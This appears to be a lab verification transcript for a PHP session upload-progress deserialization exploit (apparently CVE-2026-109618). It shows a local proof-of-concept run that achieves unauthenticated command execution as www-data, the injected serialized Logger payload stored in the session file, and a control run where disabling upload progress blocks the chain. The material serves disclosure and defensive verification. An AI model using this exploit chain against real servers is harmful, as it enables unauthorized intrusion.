# Lab verification transcript — CVE-2026-109618/109619

Recorded 2026-10-21 (UTC) on the `lab/` environment in this repo
(Docker, `php:8.2.34-fpm`, nginx, per-directory `session.serialize_handler`).

## 1. Unauthenticated RCE — PHP 8.2.34, vulnerable defaults

```
$ docker build -t cve618-lab lab/ && docker run -d --name cve618-lab -p 127.0.0.1:8080:80 cve618-lab
$ curl -s http://127.0.0.1:8080/api/app.php
[api] session started
$ docker exec cve618-lab php -i | grep -E 'upload_progress.enabled|upload_progress.cleanup|strict_mode'
session.upload_progress.cleanup => Off => Off
session.upload_progress.enabled => On => On
session.use_strict_mode => Off => Off

$ python3 lab/poc_local.py 127.0.0.1 8080 'id; uname -sr'
[*] sid=554e8674eeb783407894a2144c6cf2cd  payload=48 B  gadget=Logger->cmd
[1] seed  POST /app/seed.php -> HTTP 200 (15 B)
[2] fire  GET  /api/app.php -> HTTP 200 (269 B)
---- response body ----
[gadget] uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 7.0.0-34-generic

Warning: session_start(): Failed to decode session object. Session has been destroyed in /var/www/html/api/app.php on line 8
[api] session started
---- end ----
[+] command output seen — RCE confirmed
```

Command executes inside `session_start()`'s decode-failure cleanup, before the
script body — the injected object's `__destruct` runs `system()` as www-data.

## 2. Seeded session blob on disk (smoking gun)

Replaying only the SEED step and dumping the session file:

```
$ cat /var/lib/php/sessions/sess_deadbeef...cafef00d
a:1:{s:53:"upload_progress_|O:6:"Logger":1:{s:3:"cmd";s:2:"id";}";a:5:{s:10:"start_time";i:1792593191; ... }}
```

The attacker-controlled `PHP_SESSION_UPLOAD_PROGRESS` field becomes the session
key `upload_progress_|<serialized object>` stored verbatim — the inner `|` and
payload survive intact. The FIRE request's directory decodes with the `php`
handler, splits at that first `|`, and unserializes the object.

## 3. Control: official partial mitigation blocks the chain

`session.upload_progress.enabled=0` must be loaded AFTER the vulnerable
defaults — an ini file named `99-mitig.ini` is alphabetically loaded BEFORE
`99-vuln.ini` and gets overridden (verified: exploit still worked with a
mis-ordered mitigation; this is exactly why the PHP advisory says
".user.ini / ini_set() style settings are not reliable").

```
$ docker exec cve618-lab sh -c 'echo "session.upload_progress.enabled=0" > /usr/local/etc/php/conf.d/99-zz-mitig.ini'
$ docker restart cve618-lab
$ docker exec cve618-lab php -i | grep upload_progress.enabled
session.upload_progress.enabled => Off => Off

$ python3 lab/poc_local.py 127.0.0.1 8080 'id'
[1] seed  POST /app/seed.php -> HTTP 200 (15 B)
[2] fire  GET  /api/app.php -> HTTP 200 (22 B)
---- response body ----
[api] session started
---- end ----
[+] no command output: check gadget class/handler dirs
```

Same exploit, zero effect. The injection channel is `session.upload_progress`.

## Notes

- This lab chain demonstrates the session/upload-progress exploitation family
  of the advisory (GHSA-6wmf-4rv5-p3rp "Session upload progress lifecycle:
  confirmed"). The OOM/longjmp memory-corruption paths (GHSA-w8hw-w9fx-j79w)
  require per-build heap grooming and are not reproduced here.
- Fixed versions: 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 (2026-10-21).
- Technique credits: junaire/CVE-2026-109618-exploit (public PoC lab profile),
  pocbit/murrez php2shell PoC, Calif × OpenAI and Wiz Research writeups,
  PHP GHSA advisories. See the main README.
- Authorized security research only. Point the PoC at 127.0.0.1.
